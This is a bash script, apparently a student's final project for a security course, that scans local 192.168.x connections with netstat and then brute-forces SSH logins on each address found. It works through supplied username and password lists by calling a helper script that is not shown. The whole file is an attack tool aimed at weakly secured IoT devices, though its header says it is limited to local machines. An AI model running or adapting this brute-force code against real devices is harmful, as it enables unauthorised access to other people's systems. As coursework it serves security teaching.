#!/bin/bash

#####################################################################################
# Joe Sanford
# COMP 116 Final Project
#
# Usage: sh iotattack.sh <password_list.txt> <username_list.txt>
#
# As security of many devices in the Internet of Things is flawed, including the 
# fact that ~70% of devices have weak security, this script lists local services so 
# that you can look for certain devices on the network, and using the IP address to 
# brute-force the password over SSH. Many devices are running a version of Linux
# making SSH brute forcing possible.
#
# NOTE: This script only looks at local machines for sandboxing and safety purposes.
#####################################################################################

if [[ -z "$2" || -z "$1" ]]; then
	echo "Usage: ./iotattack <password_list.txt> <username_list.txt>"
	exit 0
fi

PASSWORDS="$1"
USERNAMES="$2"

echo "Enter service name (if known, press ENTER for NONE)"
read SERVICENAME

echo "Checking network, one moment..."
if [ -z "$SERVICENAME" ]; then
	STATUS="$(netstat -tcp | grep 192.168. | awk -F "[ :]*" '{print $4}' | cut -d . -f1-4 | uniq )"
else
	STATUS="$(netstat -tcp | grep $SERVICENAME | grep 192.168. | awk -F "[ :]*" '{print $4}' | cut -d . -f1-4 | uniq )"
fi

echo "IP addresses to be tried:"
echo "${STATUS}"

for IP_ADDR in ${STATUS//\\n/}; do
	for UN in $(cat $USERNAMES); do
		echo "Attempting to brute force $UN at $IP_ADDR"
		for PW in $(cat $PASSWORDS); do
			./do_iotattack.sh "$IP_ADDR" "$PW" "$UN" &> /dev/null
		done
  done
done